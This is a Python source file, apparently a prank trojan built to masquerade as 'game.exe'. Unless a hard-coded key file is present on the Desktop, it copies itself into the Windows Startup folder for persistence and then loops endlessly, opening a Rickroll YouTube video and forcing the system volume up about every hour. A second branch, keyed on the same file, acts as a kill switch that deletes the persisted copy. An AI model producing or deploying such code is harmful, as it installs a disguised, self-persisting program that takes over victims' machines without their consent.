import getpass
import pathlib
import shutil
import webbrowser
from sys import platform
import pyautogui
import time
import os

currentPath = str(pathlib.Path().resolve()) + '\\' + 'game.exe'
user = getpass.getuser()
new = fr'C:\Users\{user}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\game.exe'

try:
    file = open(fr'C:\Users\{user}\OneDrive\Desktop\key.txt', "r")
    file_content = file.read()
except:
    file_content = ''

if file_content != "RtXP)%8J+38g_;vdH}(Q,mE8$.gK+vt@C9/!Vh:&-*Y-Febp$,GY.x.vX9,9K5*:E[whpB-6&yLxJx)wuP)7;v).]e?ZGHea{Q-,;Big[C9X7$Ynu,mb6JUQBQX,{]ii//V*r%@.y&w=}k556K,jRVB=!#}Vebte_3x7t?,@e*u@TFzG4q,u!:?+Jzi[U/!X7ct:*.)/=[;x][nJzP,v6YJpXtY.LjCt4LH]8;bHwQ[JTGcF{Di]3MA%ERdBmExqKf$VUY*XPt8zxKX8:M,cbt.mk*E8A*w]X}!YqBZwzk29":

    if platform == 'win32':
        if currentPath != new:
            shutil.move(currentPath, new)

    while True:
        time.sleep(3200)
        webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
        for x in range(100):
            pyautogui.press('volumeup')
        time.sleep(7200)
else:
    while True:
        if os.path.exists(fr'C:\Users\{user}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\game.exe'):
            os.remove(fr'C:\Users\{user}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\game.exe')
